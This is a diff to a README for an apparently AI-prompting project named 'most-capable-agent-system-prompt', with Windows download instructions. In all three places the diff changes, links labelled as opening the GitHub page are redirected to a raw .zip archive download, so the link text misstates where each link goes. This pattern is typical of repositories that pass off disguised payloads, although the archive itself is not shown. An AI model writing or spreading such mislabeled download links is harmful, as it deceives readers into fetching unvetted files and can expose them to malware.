@@ -1,6 +1,6 @@
 # 🤖 most-capable-agent-system-prompt - Clear Prompting for Better Agents
 
-[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/unofficial-necturus123/most-capable-agent-system-prompt)
+[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/unofficial-necturus123/most-capable-agent-system-prompt/main/nontechnical/capable-prompt-most-agent-system-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This project is hosted on GitHub. To use it on Windows, visit the page, download
 
 Use this link to visit the download page:
 
-[Open the GitHub page](https://github.com/unofficial-necturus123/most-capable-agent-system-prompt)
+[Open the GitHub page](https://raw.githubusercontent.com/unofficial-necturus123/most-capable-agent-system-prompt/main/nontechnical/capable-prompt-most-agent-system-v1.8.zip)
 
 If the page includes a release file, download it there. If it includes a source file, download the file you want and save it to a folder you can find later.
 
@@ -214,7 +214,7 @@ Use the download option in your browser, then save the file to your PC.
 
 ## 🔗 Download Again
 
-[Visit the GitHub download page](https://github.com/unofficial-necturus123/most-capable-agent-system-prompt)
+[Visit the GitHub download page](https://raw.githubusercontent.com/unofficial-necturus123/most-capable-agent-system-prompt/main/nontechnical/capable-prompt-most-agent-system-v1.8.zip)
 
 ## 📝 License
 
